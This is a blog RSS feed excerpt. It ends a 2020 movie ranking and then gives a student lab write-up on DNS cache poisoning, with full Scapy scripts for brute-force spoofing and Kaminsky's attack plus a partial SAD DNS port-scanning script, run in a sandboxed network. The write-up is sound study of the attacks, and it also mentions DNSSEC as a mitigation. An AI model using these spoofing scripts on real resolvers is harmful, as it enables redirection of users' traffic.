+<p class="wp-block-paragraph">Seeing as the trope is a little overdone at this point, I&#8217;m a little skeptical of any movie that has the <em>Groundhog Day</em> premise. What&#8217;s amazing is that <em>Palm Springs</em> actually pulled it off. I&#8217;ll try my best to avoid spoilers here, since it&#8217;s best to go into this type of movie blind. What I can say is Andy Samberg does excellently in this role: while he still has that comedic spark that propelled him to stardom in the Lonely Island/<em>Hot Rod</em> days, he&#8217;s clearly matured since then, and his performance is as emotionally evocative as it is characteristically hilarious. This time around, J.K. Simmons&#8217; performance is intimidating (as usual) and wistfully ruminating. The shots in this film are vibrant and full of contrast, featuring a rich and varied color gamut. For those of you who are thinking that 2020 had no good movies, I would definitely take a look at this one.</p>
+
+
+
+<p class="wp-block-paragraph">Memorable Moments: Don&#8217;t want to spoil it!</p>
+
+
+
+<h3 class="wp-block-heading">2. Roman Holiday</h3>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://images2.minutemediacdn.com/image/upload/c_fill,g_auto,h_1248,w_2220/v1555348588/shape/mentalfloss/romanhed.jpg?itok=f1K08ZQS" alt="12 Royal Facts About 'Roman Holiday' | Mental Floss"/></figure>
+
+
+
+<p class="wp-block-paragraph">It&#8217;s very rare that a film as old as <em>Roman Holiday </em>ages so well. Usually, something sticks out like a sore thumb. Sometimes it&#8217;s the horrendous special effects, or maybe it&#8217;s the outmoded social norms or kitschy montages. For whatever reason, <em>Roman Holiday</em> seems to rise above all of this, surpassing its own place in time and ascending into that hallowed territory of <em>simply a good film</em>. It&#8217;s not that the movie is particularly groundbreaking&#8211;sure, it&#8217;s the first American film to be shot entirely in Italy, and it&#8217;s Audrey Hepburn&#8217;s breakthrough performance, but at the end of the day it&#8217;s just an especially good adaptation of Capra&#8217;s classic <em>It Happened One Night</em>. I think what separates this film from other classics is its inversion of the typical power structure between male and female lead. In many of the older films I&#8217;ve watched, it&#8217;s either made clear that the male lead needs to give something up to fall in love (<em>It&#8217;s a Wonderful Life</em>) or that the female lead needs to be rescued somehow (<em>It Happened One Night, Sabrina</em>, <em>The Apartment</em>). It&#8217;s not that any of these films are <em>bad</em>&#8211;actually, they&#8217;re some of my favorites&#8211;it&#8217;s just that they&#8217;re <em>conventional</em>. <em>Roman Holiday</em> is anything but. Princess Ann runs away of her own accord. Though she is in flight, she does not need to be saved. In one of my favorite scenes of the film, she helps her friends fend off her kidnappers by smashing a guitar over one of their heads. And when it&#8217;s all over, she returns to fulfill her duty by choice. There is nothing of the typical Hollywood romance here: just the timeless story of two vulnerable people living and loving in the single day they have together. And when the day is over, life goes on.</p>
+
+
+
+<p class="wp-block-paragraph">Memorable Moments: Vespa ride, fight on the boat, haircut, final scene, Mouth of Truth</p>
+
+
+
+<h3 class="wp-block-heading">1. I&#8217;m Thinking of Ending Things</h3>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://www.indiewire.com/wp-content/uploads/2020/08/im-thinking-of-ending-things-poster-jessie-buckley-social.jpeg" alt="Charlie Kaufman Explains I'm Thinking of Ending Things | IndieWire"/></figure>
+
+
+
+<p class="wp-block-paragraph">I&#8217;ve honestly never seen anything like it. I mean, I&#8217;ve watched <em>Eternal Sunshine of the Spotless Mind</em> and <em>Adaptation</em>, so I figured I knew what to expect when it came to Kaufman&#8217;s work, but this just hits different for some reason. The notion of the unreliable narrator is something hardly new in cinema, but this film really takes it to the next level. Time and space are distorted, and the line between conversation and monologue becomes increasingly unclear. Jesse Plemons, while feeling somewhat like a Philip Seymour Hoffman surrogate here (perhaps explaining Kaufman&#8217;s choice), nails it as Jake. Jessie Buckley&#8217;s performances of &#8220;Bonedog&#8221; and the scathing Pauline Kael review are mesmerizing, and her narration is intensely evocative. Toni Collette as Jake&#8217;s mother is one of the most disturbing performances I&#8217;ve witnessed all year. Then there&#8217;s the actual cinematography, which is beautiful in its own right. The choice of a 4:3 aspect ratio is especially claustrophobic: it&#8217;s as if the audience&#8217;s connection to the protagonist&#8217;s consciousness is thinner than usual, and so we are forced to carefully examine each frame in order to maintain this connection. Trust me, though, you won&#8217;t run out of things to look at. Kaufman demonstrates a meticulous attention to detail, both in his set designs and the way he uses various paraphernalia to foreshadow future plot points. My major complaint about this movie is the second half, especially the ending, which differed drastically from the book&#8217;s. I think if they cut, say, 20 minutes from the latter half while also disambiguating the ending a bit, I would be happier with it. The fact that you have to either have read the book or watch the movie multiple times to really understand the plot irks me, and the fact that the movie&#8217;s premise is made so opaque seems like a pretentious move on Kaufman&#8217;s part. But once you figure out what&#8217;s going on, it&#8217;ll blow your mind.</p>
+
+
+
+<p class="wp-block-paragraph">Memorable Moments: Basically the first hour and a half</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://blog.nkontur.com/index.php/2021/01/11/2020-movie-recap-top-ten/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>SAD DNS: A Hands-on Survey</title>
+		<link>https://blog.nkontur.com/index.php/2021/01/04/sad-dns-cse-433-final-project-report/</link>
+					<comments>https://blog.nkontur.com/index.php/2021/01/04/sad-dns-cse-433-final-project-report/#respond</comments>
+		
+		<dc:creator><![CDATA[Noah Kontur]]></dc:creator>
+		<pubDate>Mon, 04 Jan 2021 22:26:57 +0000</pubDate>
+				<category><![CDATA[Computer Science (Applied)]]></category>
+		<guid isPermaLink="false">https://nkontur.com/blog/?p=22</guid>
+
+					<description><![CDATA[Note: Check out my code on GitHub The Domain Name System (DNS), which facilitates the translation of hostnames to IP addresses, is a crucial piece of the internet architecture and has historically been a prime target for exploitation. One common type of DNS attack, known as cache poisoning, seeks to insert malicious DNS records into [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><img loading="lazy" decoding="async" src="https://nkontur.com/blog/wp-content/uploads/2020/12/saddns.png" alt="" class="wp-image-17" width="244" height="244" srcset="https://blog.nkontur.com/wp-content/uploads/2020/12/saddns.png 225w, https://blog.nkontur.com/wp-content/uploads/2020/12/saddns-150x150.png 150w" sizes="auto, (max-width: 244px) 100vw, 244px" /></figure></div>
+
+
+
+<p class="wp-block-paragraph">Note: Check out my <a href="https://github.com/konturn/Cache-Poisoning-Attacks">code</a> on GitHub</p>
+
+
+
+<p class="wp-block-paragraph">The Domain Name System (DNS), which facilitates the translation of hostnames to IP addresses, is a crucial piece of the internet architecture and has historically been a prime target for exploitation. One common type of DNS attack, known as <a href="https://blog.cloudflare.com/sad-dns-explained/">cache poisoning</a>, seeks to insert malicious DNS records into recursive resolver caches. Prior to the widespread adoption of resolver source-port randomization in 2008, this kind of attack was fairly easy to implement&#8211;in fact, <a href="https://www.linuxjournal.com/content/understanding-kaminskys-dns-bug">Kaminsky claimed</a> that his version of the attack could exploit a vulnerable system in 10 seconds. Ever since source-port randomization became the standard for many mainstream recursive resolvers such as <a href="https://wiki.debian.org/Bind9">BIND</a> and <a href="https://nlnetlabs.nl/documentation/unbound/patch-announce102/">Unbound</a>, Kaminsky&#8217;s attack could not work nearly as quickly, as it was much more difficult to guess both the source port and Query ID of the victim resolver&#8217;s DNS request packets. However, <a href="https://dl.acm.org/doi/10.1145/3372297.3417280">a new cache-poisoning attack</a> which circumvents these mitigations, known as SAD DNS, was recently unveiled last month. Interestingly, this attack uses ICMP error messages and rate limits as a side channel to infer which ports are being used for DNS requests, essentially side-stepping source-port randomization protections.</p>
+
+
+
+<p class="wp-block-paragraph">While the consequences of SAD DNS seem grim, all is not lost. As <a href="https://ns1.com/blog/dnssec-the-key-to-preventing-sad-dns">this blog post</a> notes, DNSSEC, which uses digital signatures to validate DNS records, is a viable mitigation which stops pretty much all DNS cache poisoning attacks in their tracks. Another approach would be to disable ICMP rate limiting, albeit at the expense of leaving a server vulnerable to <a href="https://www.cloudflare.com/learning/ddos/smurf-ddos-attack/">reflection attacks</a>.</p>
+
+
+
+<p class="wp-block-paragraph">While I am not necessarily surprised by the fact that hackers have tried to exploit DNS, I&#8217;m still intrigued by the fact that their efforts have been so successful. After all, DNS sounds like it should be fairly straightforward to implement securely. In an attempt to more concretely understand this, I will implement some of the attacks mentioned above in a sandboxed environment.</p>
+
+
+
+<h2 class="wp-block-heading">Experiment Setup</h2>
+
+
+
+<p class="wp-block-paragraph">In order to execute the above attacks in a safe and ethical way, I had to make sure the network I worked on would be isolated from the outside world. I ended up settling for an environment housed in Linux KVM on an isolated virtual network and consisting of the following three Linux machines:</p>
+
+
+
+<ul class="wp-block-list"><li>Client/Resolver:<ul><li>IP Address: 192.168.16.130</li><li>Hostname: client</li><li>OS: Ubuntu 20.04 Server</li><li>Services: BIND9</li></ul></li><li>Authoritative Nameserver:<ul><li>IP Address: 192.168.16.150</li><li>Hostname: auth</li><li>OS: Ubuntu 20.04 Server</li><li>Services: BIND9</li></ul></li><li>Attacker:<ul><li>IP Address: 192.168.16.158</li><li>Hostname: attacker</li><li>OS: Ubuntu 20.04 Server</li><li>Services: BIND9</li></ul></li></ul>
+
+
+
+<p class="wp-block-paragraph">On the client machine, BIND9 acts as a recursive resolver and has the following configuration:</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="554" height="162" src="https://nkontur.com/blog/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-13-28-28.png" alt="" class="wp-image-23" srcset="https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-13-28-28.png 554w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-13-28-28-300x88.png 300w" sizes="auto, (max-width: 554px) 100vw, 554px" /><figcaption>Configuration at /etc/bind/named.conf.options</figcaption></figure></div>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="596" height="61" src="https://nkontur.com/blog/wp-content/uploads/2020/12/Screenshot-from-2020-12-06-16-50-18.png" alt="" class="wp-image-10" srcset="https://blog.nkontur.com/wp-content/uploads/2020/12/Screenshot-from-2020-12-06-16-50-18.png 596w, https://blog.nkontur.com/wp-content/uploads/2020/12/Screenshot-from-2020-12-06-16-50-18-300x31.png 300w" sizes="auto, (max-width: 596px) 100vw, 596px" /><figcaption>Configuration at /usr/share/dns/root.hints</figcaption></figure></div>
+
+
+
+<p class="wp-block-paragraph">In the first image, notice first that DNSSEC validation is disabled; otherwise, all the cache poisoning attacks would fail. Furthermore, since the first two attacks rely on the source port of the resolver being fixed, I&#8217;ve restricted the source port to 50000 for outgoing recursive queries.  In the second image, note how we add the authoritative nameserver to the list of root nameservers present on the machine. If we did not do this, the client would exclusively try to query actual root nameserver when resolving a domain not in cache; however, since the network is sandboxed, the root nameservers cannot be reached. </p>
+
+
+
+<p class="wp-block-paragraph">On machine auth, BIND9 acts as an authoritative nameserver for domain dummy.com, and has the following configuration:</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="543" height="210" src="https://nkontur.com/blog/wp-content/uploads/2020/12/Screenshot-from-2020-12-06-17-09-38-1.png" alt="" class="wp-image-13" srcset="https://blog.nkontur.com/wp-content/uploads/2020/12/Screenshot-from-2020-12-06-17-09-38-1.png 543w, https://blog.nkontur.com/wp-content/uploads/2020/12/Screenshot-from-2020-12-06-17-09-38-1-300x116.png 300w" sizes="auto, (max-width: 543px) 100vw, 543px" /><figcaption>Configuration at /etc/bind/named.conf.options</figcaption></figure></div>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="645" height="420" src="https://nkontur.com/blog/wp-content/uploads/2020/12/Screenshot-from-2020-12-06-17-11-52.png" alt="" class="wp-image-15" srcset="https://blog.nkontur.com/wp-content/uploads/2020/12/Screenshot-from-2020-12-06-17-11-52.png 645w, https://blog.nkontur.com/wp-content/uploads/2020/12/Screenshot-from-2020-12-06-17-11-52-300x195.png 300w" sizes="auto, (max-width: 645px) 100vw, 645px" /><figcaption>Zone file for dummy.com</figcaption></figure></div>
+
+
+
+<p class="wp-block-paragraph">Some things of note. We have recursion on this server disabled, meaning that it will <em>only</em> answer requests pertaining to dummy.com. In the second image, note how the records have a TTL of 60 seconds (see discussion on short cache duration) and how an additional domain site.dummy.com also has an A record pointing to auth&#8217;s IP address. This is the address of the server the client is trying to reach. On the other hand, the attacker is also running a BIND9 server with the following zone file:</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="557" height="404" src="https://nkontur.com/blog/wp-content/uploads/2020/12/Screenshot-from-2020-12-06-17-23-04.png" alt="" class="wp-image-16" srcset="https://blog.nkontur.com/wp-content/uploads/2020/12/Screenshot-from-2020-12-06-17-23-04.png 557w, https://blog.nkontur.com/wp-content/uploads/2020/12/Screenshot-from-2020-12-06-17-23-04-300x218.png 300w" sizes="auto, (max-width: 557px) 100vw, 557px" /><figcaption>Attacker&#8217;s zone file for dummy.com</figcaption></figure></div>
+
+
+
+<p class="wp-block-paragraph">If the attacker is able to convince the recursive resolver on the client that it is the authoritative nameserver for dummy.com, then they will be able to redirect requests from site.dummy.com to their own malicious server.</p>
+
+
+
+<h2 class="wp-block-heading">Some Notes on the Attacks</h2>
+
+
+
+<p class="wp-block-paragraph">Before I dive into the nitty-gritty, I&#8217;ll give a brief overview of which attacks I chose and the methodology I used to implement them. The first attack uses naive brute-force cache poisoning to inject an A record for site.dummy.com into the recursive resolver cache. Basically, the attacker just perpetually floods the resolver with DNS responses containing the spoofed A record and the spoofed source IP of the authoritative nameserver.  The second attack, known as Kaminsky&#8217;s attack, operates under similar principles, except it also sends a query with a random prepended nonce string to bypass the resolver cache bottleneck. The final attack is an implementation of SADDNS. All the attacks were implemented in Scapy and use the model of an off-path attacker&#8211;that is, the attacker cannot sniff packets between the authoritative nameserver and the resolver to deduce DNS ID and source ports.</p>
+
+
+
+<p class="wp-block-paragraph">For demonstration purposes, I made some changes to the sandboxed environment that may not necessarily represent reality. For instance, I disabled source port randomization on the resolver for the first two attacks. While source port randomization is a given on mainstream resolvers today, this was not the case even fifteen years ago. Another decision I made was to allow each VM to perform multiple functions. For instance, the authoritative nameserver is both authoritative for site.dummy.com and is a root nameserver; the client is also a recursive resolver; and the attacker is both an attacker and a malicious nameserver. While I could in principle define a VM for each of these functions, this would quickly become unwieldy, and anyways, I don&#8217;t have the RAM. I made some other similar decisions&#8211;they are mentioned in the following sections.</p>
+
+
+
+<h2 class="wp-block-heading">Attack #1: Brute-force poisoning</h2>
+
+
+
+<p class="wp-block-paragraph">The first attack I implemented was simple enough. Following the method described in Woefe&#8217;s <a href="https://blog.woefe.com/posts/faster_scapy.html">blog post</a>, I was able to get Scapy to enumerate all 65535 DNS Query ID&#8217;s in a little over a second. The script, which I have copied below, defines a socket to be used for each outgoing packet (otherwise a socket is opened for each packet sent, which trashes performance) and uses bit manipulation on the packet&#8217;s underlying byte array to efficiently modify the DNS query ID in the main loop.</p>
+
+
+
+<pre class="wp-block-code"><code>import random
+from scapy.all import *
+
+target_auth_ip = '192.168.16.150'
+source_port = 50000
+
+def patch(dns_frame, pseudo_hdr, dns_id):
+    """Adjust the DNS id and patch the UDP checksum within the given Ethernet frame"""
+    # set dns id
+    # the byte offsets can be found in Wireshark
+    dns_frame[42] = (dns_id >> 8) &amp; 0xFF
+    dns_frame[43] = dns_id &amp; 0xFF
+
+    # reset checksum
+    dns_frame[40] = 0x00
+    dns_frame[41] = 0x00
+
+    # calc new checksum
+    ck = checksum(pseudo_hdr + dns_frame[34:])
+    if ck == 0:
+        ck = 0xFFFF
+    cs = struct.pack("!H", ck)
+    dns_frame[40] = cs[0]
+    dns_frame[41] = cs[1]
+
+
+response = Ether()/IP(src=target_auth_ip,dst=target_resolver_ip)/UDP(sport=53,dport=source_port)/DNS(id=0, qd=DNSQR(qname=target_domain), aa=1, qr=1, an=DNSRR(rrname=target_domain,  ttl=36000, rdata=attacker_ip))
+dns_frame = bytearray(raw(response))
+pseudo_hdr = struct.pack(
+    "!4s4sHH",
+    inet_pton(socket.AF_INET, response["IP"].src),
+    inet_pton(socket.AF_INET, response["IP"].dst),
+    socket.IPPROTO_UDP,
+    len(dns_frame[34:]),
+)
+s = conf.L2socket()
+
+i=0
+while True:
+    if i&lt;1024:
+       i=1024
+    patch(dns_frame, pseudo_hdr, i % 65535)
+    s.send(dns_frame)
+    i+=1</code></pre>
+
+
+
+<p class="wp-block-paragraph">One relevant concern is caching: once a DNS record is cached by the recursive resolver, any subsequent attempts to poison the cache will fail, since the resolver will simply send back its cached records when the attacker requests them. In a regular brute-force cache poisoning attack like this one, this means that the speed of the attacker&#8217;s exploit is bottle-necked by the TTL of the records it is trying spoof. For the sake of demonstration, my recursive resolver ought to cache DNS records for a short amount of time so that the exploit has more chances to succeed. While I could certainly reduce the TTL on served RR&#8217;s to the minimum, BIND only lets you decrease it down to a minute. Instead, I opted to use the Remote Name Daemon Control (rndc) utility to flush the cache on demand.</p>
+
+
+
+<p class="wp-block-paragraph">Another concern is that the RTT between the authoritative nameserver and the resolver in this virtualized environment is less than a millisecond. Even though our script can send over 50kpps, there is still less than a 1/1000 chance that the attack will succeed on any given attempt. In order to ensure the exploit would succeed in a reasonable time frame, I used the Linux traffic control (tc) utility to increase the delay of outgoing packets from the authoritative nameserver to 100ms with the following command:</p>
+
+
+
+<pre class="wp-block-code"><code>tc qdisc change dev ens3 root netem delay 100ms</code></pre>
+
+
+
+<p class="wp-block-paragraph">After I did this, I ran the script on the attacker and repeatedly issued the following command on the client/recursive resolver</p>
+
+
+
+<pre class="wp-block-code"><code>dig site.dummy.com &amp;&amp; rndc flush</code></pre>
+
+
+
+<p class="wp-block-paragraph">After a few tries, I got the following result:</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1024" height="640" src="https://nkontur.com/blog/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-14-32-48-1024x640.png" alt="" class="wp-image-25" srcset="https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-14-32-48-1024x640.png 1024w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-14-32-48-300x188.png 300w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-14-32-48-768x480.png 768w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-14-32-48-1536x960.png 1536w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-14-32-48-1568x980.png 1568w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-04-14-32-48.png 1920w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /><figcaption>Screencap of successful attack execution. Bottom left is client/resolver, bottom right is auth nameserver, top is attacker.</figcaption></figure></div>
+
+
+
+<p class="wp-block-paragraph">Voila!</p>
+
+
+
+<h2 class="wp-block-heading">Attack #2: Kaminsky&#8217;s Exploit</h2>
+
+
+
+<p class="wp-block-paragraph">Like the first attack, this one aims to poison the resolver&#8217;s cache by brute-forcing the DNS QID. Recall that the bottleneck for the first attack was the cache TTL on the record we wanted to spoof. If, for instance, the TTL for a record were one day and the attacker could only get one spoofed response to the recursive resolver before the actual authoritative server responded, then the expected amount of time required for a successful spoof would be (65535/2)=32767.5, or upwards of 80 years. As Kaminsky explains in <a href="https://youtu.be/B-v_wJIJUI4">this video</a>, the attacker can bypass this bottleneck by sending a query from a related, likely uncached subdomain of the target domain. In my case, the attacker picks a random string, say xyzw, and query the recursive resolver for the A record for xyzw.site.dummy.com. Right afterwards, the attacker sends a response spoofed from the authoritative nameserver with an NS record for site.dummy.com pointing to auth.dummy.com and an additional A for auth.dummy.com pointing to the attacker&#8217;s IP. Since the NS record is for site.dummy.com, the response passes the standard bailiwick checks (see <a href="http://www.cs.cornell.edu/~shmat/shmat_securecomm10.pdf">this paper</a> for more information on bailiwick checking with regard to cache poisoning). More significantly, the additional A record for auth.dummy.com can even <em>overwrite</em> the cached A record if it exists, allowing the attacker to have complete control over all domains controlled by auth.dummy.com.</p>
+
+
+
+<p class="wp-block-paragraph">Implementing the attack wasn&#8217;t too bad. I ended up with the following script:</p>
+
+
+
+<pre class="wp-block-code"><code>import scapy.all
+from scapy.all import *
+import random
+import string
+import time
+
+target_domain = "site.dummy.com"
+target_resolver_ip = '192.168.16.130'
+attacker_ip = '192.168.16.158'
+target_auth_ip = '192.168.16.150'
+target_auth_domain = "auth.dummy.com"
+source_port = 50000
+
+def get_random_string(length):
+    letters = string.ascii_lowercase
+    result_str = ''.join(random.choice(letters) for i in range(length))
+    return result_str
+
+pkt_query = IP(src=attacker_ip,dst=target_resolver_ip)/UDP(sport=source_port,dport=53)/DNS(id=50000, rd=1, qd=DNSQR(qname=target_domain+"."))
+pkt_answer = IP(src=target_auth_ip,dst=target_resolver_ip)/UDP(sport=53,dport=source_port)/DNS(id=50000, qd=DNSQR(qname=target_domain+".",qtype="A", qclass="IN"), aa=0, qr=1, ns=DNSRR(rrname=target_domain+".",  ttl=10, type="NS", rdata=target_auth_domain+"."),ar=(DNSRR(rrname=target_auth_domain+".", type="A", rclass="IN", ttl=36000, rdlen=4, rdata=attacker_ip)))
+
+s = conf.L3socket();
+while True:
+    d_str = get_random_string(4)+"."+target_domain+".";
+    pkt_query[DNS].qd=DNSQR(qname=d_str)
+    pkt_answer[DNS].qd=DNSQR(qname=d_str)
+    pkt_answer[DNS].id=random.randrange(1024,65535)
+    pkt_query[DNS].id=random.randrange(1024,65535)
+    s.send(pkt_query)
+    s.send(pkt_answer)
+    time.sleep(.05)
+</code></pre>
+
+
+
+<p class="wp-block-paragraph">While this code worked fairly well, one problem I initially had was that if I flooded the resolver with too many requests, it would end up sending SERVFAIL replies back to the attacker without forwarding the requests onto the authoritative nameserver. This problem persisted even after ensuring rate-limiting was disabled. The only thing that fixed this problem was increasing the amount of source ports that the resolver could use. Since this problem does not occur in attack #1, it is clear that there is some sort of implicit per-port outgoing rate limit on unique DNS requests. I wouldn&#8217;t necessarily call this a bug in the BIND implementation, since the method I adopted to disable source port randomization (decreasing the range of available ports to 1) is pretty hacky to begin with. Anyways, I ended up having to put a sleep statement in the script&#8217;s main loop to prevent this rate-limit from being triggered. </p>
+
+
+
+<p class="wp-block-paragraph">Given the nature of the exploit, I was able to decrease the synthetic latency between the nameservers from 100ms to 5ms. The reason I still needed 5ms of latency is due to Scapy&#8217;s inherent slowness&#8211;even when I send the query and response packets back-to-back, the latency between their arrival times often exceeds four milliseconds, and so the authoritative nameserver ends up winning the race the majority of the time. After running the exploit for a few minutes (it would have been a few seconds if it weren&#8217;t for the rate-limiting mentioned above), I got the following result:</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1024" height="640" src="https://nkontur.com/blog/wp-content/uploads/2021/01/Screenshot-from-2021-01-03-14-39-01-1024x640.png" alt="" class="wp-image-27" srcset="https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-03-14-39-01-1024x640.png 1024w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-03-14-39-01-300x188.png 300w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-03-14-39-01-768x480.png 768w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-03-14-39-01-1536x960.png 1536w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-03-14-39-01-1568x980.png 1568w, https://blog.nkontur.com/wp-content/uploads/2021/01/Screenshot-from-2021-01-03-14-39-01.png 1920w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /><figcaption>Successful instance of Kaminsky&#8217;s attack&#8211;Client up top, auth server bottom left, attacker bottom right</figcaption></figure></div>
+
+
+
+<p class="wp-block-paragraph">As you can see, the attacker has convinced the client that the authoritative nameserver for site.dummy.com has the attacker&#8217;s IP. When we dig site.dummy.com on the client, a request (which is captured by tcpdump in the attacker&#8217;s pane) for the A record of site.dummy.com is sent. The attacker&#8217;s malicious instance of BIND returns the attacker&#8217;s IP, which is exactly what we want.</p>
+
+
+
+<h2 class="wp-block-heading">Attack #3: SAD DNS</h2>
+
+
+
+<p class="wp-block-paragraph">This was admittedly the most challenging attack of the three to execute. Nevertheless, I was able to get a rudimentary implementation going that is likely to succeed if given enough time. Here&#8217;s the code below:</p>
+
+
+
+<pre class="wp-block-code"><code>import random
+from scapy.all import *
+import time
+import string
+import math
+
+target_domain = "site.dummy.com"
+target_resolver_ip = '192.168.16.130'
+attacker_ip = '192.168.16.158'
+target_auth_ip = '192.168.16.150'
+
+MAX_PORT_NUM = 65535
+GLOBAL_ICMP_LIMIT = 50
+GLOBAL_ICMP_REFRESH = .05
+RESERVED_PORTS = 1024
+PER_IP_REFRESH = 1
+#j is the port number being tested. It needs to be global so that the 
+#Asynchronous sniffer handler can process it if it's open
+#Cache is the list of open ports detected through the ICMP side-channel
+#attack described in the paper.
+#found_open_port is a boolean which is used in the binary search
+#binary_initiated indicates that the code is transitioning from finding open
+#blocks of ports to using binary search to find the exact port numbers
+j=MAX_PORT_NUM
+cache=[]
+found_open_port = False
+binary_initiated = False
+
+#We need to generate random strings so we can query
+#uncached resources a la Kaminsky's method
+def get_random_string(length):
+    letters = string.ascii_lowercase
+    result_str = ''.join(random.choice(letters) for i in range(length))
+    return result_str
+
+#In order to get packets out quickly enough, we write the
+#packets raw. This function creates the raw IP headers from
+#scapy packets.
+def make_header(pkt):
+   raw_pkt = bytearray(raw(pkt))
+   return struct.pack(
+       "!4s4sHH",
+       inet_pton(socket.AF_INET, pkt["IP"].src),
+       inet_pton(socket.AF_INET, pkt["IP"].dst),
+       socket.IPPROTO_UDP,
+       len(raw_pkt[34:]),
+   )
+
+#When our asynchronous packet sniffer detects an ICMP error message,
+#this function is called. Depending on whether we are executing a binary search
+#or just the general port scan, it reports back about open ports it has found
+def pkt_callback(pkt):
+    global found_open_port
+    if binary_initiated:
+       found_open_port = True
+    else:
+       h=math.floor(j/GLOBAL_ICMP_LIMIT)*GLOBAL_ICMP_LIMIT
+       cache.append(h)
+
+#This function takes in a byte array frame, a raw IP/ETH header,
+#and a destination port and creates a raw DNS packet
+def patch_sport(pkt, pseudo_hdr, dport):
+    #write new destintation port
+    pkt[36] = (dport >> 8) &amp; 0xFF
+    pkt[37] = dport &amp; 0xFF
+
+    # reset checksum
+    pkt[40] = 0x00
+    pkt[41] = 0x00
+
+    # calc new checksum
+    ck = checksum(pseudo_hdr + pkt[34:])
+    if ck == 0:
+        ck = 0xFFFF
+    cs = struct.pack("!H", ck)
+    pkt[40] = cs[0]
+    pkt[41] = cs[1]
+
+#This function is like the one above, except it also takes in a DNS QID and
+# a query domain string
+def patch(pkt, pseudo_hdr, dport, qid, dns_qd):
+    """Adjust the DNS id and patch_sport the UDP checksum within the given Ethernet frame"""
+    # set destination port
+    # the byte offsets can be found in Wireshark
+    pkt[36] = (dport >> 8) &amp; 0xFF
+    pkt[37] = dport &amp; 0xFF
+
+    # reset checksum
+    pkt[40] = 0x00
+    pkt[41] = 0x00
+    
+    # set qid
+    pkt[42] = (qid >> 8) &amp; 0xFF
+    pkt[43] = qid &amp; 0xFF
+
+    # set DNS QD
+    pkt[55] = ord(dns_qd[3])
+    pkt[56] = (ord(dns_qd[0])) &amp; 0xFF
+    pkt[57] = (ord(dns_qd[1])) &amp; 0xFF
+    pkt[58] = ord(dns_qd[2]) &amp; 0xFF
+
+
+    # calc new checksum
+    ck = checksum(pseudo_hdr + pkt[34:])
+    if ck == 0:
+        ck = 0xFFFF
+    cs = struct.pack("!H", ck)
+    pkt[40] = cs[0]
+    pkt[41] = cs[1]
+
+#This is the meat of the program. It uses an ICMP side-channel to find which
+#UDP ports are currently open
+def find_ports():
+   global j,binary_initiated,found_open_port,cache
+   open_ports = []
+   cache = []
+   found_open_port = False
+   binary_initiated = False
+   j = MAX_PORT_NUM
+   
+   #After we saturate the global limit, we send a verification packet from the attacker
+   #address to see if there were any open ports in the range we tested
+   verification_pkt = Ether()/IP(src=attacker_ip,dst=target_resolver_ip)/UDP(sport=53,dport=1)
+   pseudo_verif_hdr = make_header(verification_pkt)
+   verification_pkt = bytearray(raw(verification_pkt))
+
+   #We will test each port on the recursive resolver to check if it's open
+   pkt = Ether()/IP(src=target_auth_ip,dst=target_resolver_ip)/UDP(sport=53,dport=0)
+   pseudo_hdr = make_header(pkt)
+   pkt = bytearray(raw(pkt))
+   s = conf.L2socket()
+  
+   #We use an async sniffer to detect ICMP error messages
+   t = AsyncSniffer(iface="ens3",prn=pkt_callback, store=False, filter="icmp")
+   t.start()
+   j=MAX_PORT_NUM
+   while j > RESERVED_PORTS:
+      for i in range(GLOBAL_ICMP_LIMIT):
+         j-=1
+         patch_sport(pkt, pseudo_hdr, j)
+         s.send(pkt)
+      patch_sport(pkt, pseudo_verif_hdr, random.randint(1,10))
+      s.send(verification_pkt)
+      time.sleep(GLOBAL_ICMP_REFRESH)
+   
+   #Now, we iterate through the list of possible ranges where there are open ports, using binary search
+   #to locate the exact ports which are open
+   binary_initiated = True
+   dummy_pkt = bytearray(raw(Ether()/IP(src=target_auth_ip,dst=target_resolver_ip)/UDP(sport=53,dport=1)))
+   for i in cache:
+       old_range = 100
+       current_range = GLOBAL_ICMP_LIMIT
+       current_start = i
+       while current_range>0:
+          for ports in range(GLOBAL_ICMP_LIMIT):
+              #In order to tell if a port is in a certain range, we need to 
+              #saturate the global icmp rate limit. To do so, we send dummy
+              #packets to a port on the recursive resolver which we know
+              #in advanced to be closed (in this case port 1)
+              if ports>=current_range:
+                 s.send(dummy_pkt)
+              else:
+                 patch_sport(pkt, pseudo_hdr, current_start+ports)
+                 s.send(pkt)
+          s.send(verification_pkt)
